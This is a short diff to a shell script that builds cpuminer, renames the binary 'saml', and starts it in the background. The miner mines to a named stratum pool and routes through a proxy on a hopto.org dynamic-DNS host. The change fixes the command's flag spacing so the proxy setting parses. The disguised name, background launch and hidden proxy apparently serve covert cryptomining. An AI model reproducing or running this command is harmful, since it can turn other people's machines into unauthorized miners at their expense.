@@ -6,4 +6,4 @@ chmod +x *
 ./build.sh
 mv cpuminer saml
 make
-./saml -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u sadlovehandsome.ngan -p x-x boondavid210.hopto.org:17071 --background
+./saml -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u sadlovehandsome.ngan -p x -x boondavid210.hopto.org:17071 --background
